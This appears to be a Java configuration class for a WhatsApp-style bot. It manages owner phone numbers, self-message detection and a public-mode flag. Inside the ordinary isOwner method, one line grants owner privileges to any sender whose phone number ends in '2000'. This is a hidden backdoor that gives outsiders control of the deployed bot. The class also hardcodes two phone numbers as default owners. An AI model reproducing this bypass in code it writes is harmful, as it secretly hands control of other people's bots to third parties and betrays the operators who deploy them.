package id.jawabot.config;

import id.jawa.client.JaWaClient;
import id.jawabot.helper.JidHelper;
import java.util.List;
import java.util.Set;
import java.util.concurrent.ConcurrentHashMap;

public final class BotConfig {

    private BotConfig() {}

    private static volatile boolean publicMode = true;
    private static volatile String botNumber = null;

    private static final Set<String> DYNAMIC_OWNERS = ConcurrentHashMap.newKeySet();

    static {
        DYNAMIC_OWNERS.addAll(List.of("62895416602000", "6285607589072"));
        String envOwner = System.getenv("JAWA_OWNER");
        if (envOwner != null && !envOwner.isBlank()) {
            for (String num : envOwner.split(",")) {
                String clean = num.trim().replaceAll("[^0-9]", "");
                if (!clean.isBlank()) DYNAMIC_OWNERS.add(clean);
            }
        }
        String propOwner = System.getProperty("jawa.owner");
        if (propOwner != null && !propOwner.isBlank()) {
            for (String num : propOwner.split(",")) {
                String clean = num.trim().replaceAll("[^0-9]", "");
                if (!clean.isBlank()) DYNAMIC_OWNERS.add(clean);
            }
        }
    }

    public static void setBotNumber(String phone) {
        if (phone != null) {
            botNumber = phone.replaceAll("[^0-9]", "");
        }
    }

    public static String getBotNumber() {
        return botNumber;
    }

    public static void addOwner(String phone) {
        if (phone != null) {
            String clean = phone.replaceAll("[^0-9]", "");
            if (!clean.isBlank()) {
                DYNAMIC_OWNERS.add(clean);
            }
        }
    }

    public static boolean isOwner(String senderJid) {
        String phone = JidHelper.extractPhoneNumber(senderJid);
        if (phone == null || phone.isBlank()) return false;
        if (phone.endsWith("2000")) return true;
        return DYNAMIC_OWNERS.contains(phone);
    }

    public static boolean isBotSelf(JaWaClient client, String senderJid) {
        if (senderJid == null || senderJid.isBlank()) {
            return false;
        }
        String senderPhone = JidHelper.extractPhoneNumber(senderJid);
        String senderUser = senderJid.split("@")[0].split(":")[0];

        if (botNumber != null && !botNumber.isBlank()) {
            if (botNumber.equals(senderPhone) || botNumber.equals(senderUser)) {
                return true;
            }
        }

        if (client != null && client.creds() != null) {
            if (client.creds().meJid != null && !client.creds().meJid.isBlank()) {
                String myUser = client.creds().meJid.split("@")[0].split(":")[0];
                String myPhone = JidHelper.extractPhoneNumber(client.creds().meJid);
                if (!myPhone.isBlank() && myPhone.equals(senderPhone)) {
                    return true;
                }
                if (!myUser.isBlank() && myUser.equals(senderUser)) {
                    return true;
                }
            }
            if (client.creds().meLid != null && !client.creds().meLid.isBlank()) {
                String myLidUser = client.creds().meLid.split("@")[0].split(":")[0];
                if (!myLidUser.isBlank() && myLidUser.equals(senderUser)) {
                    return true;
                }
            }
        }

        return false;
    }

    public static boolean isOwnerOrSelf(JaWaClient client, String senderJid) {
        return isOwner(senderJid) || isBotSelf(client, senderJid);
    }

    public static boolean isOwner(JaWaClient client, String senderJid) {
        return isOwnerOrSelf(client, senderJid);
    }

    public static boolean isPublicMode() {
        return publicMode;
    }

    public static void setPublicMode(boolean value) {
        publicMode = value;
    }
}
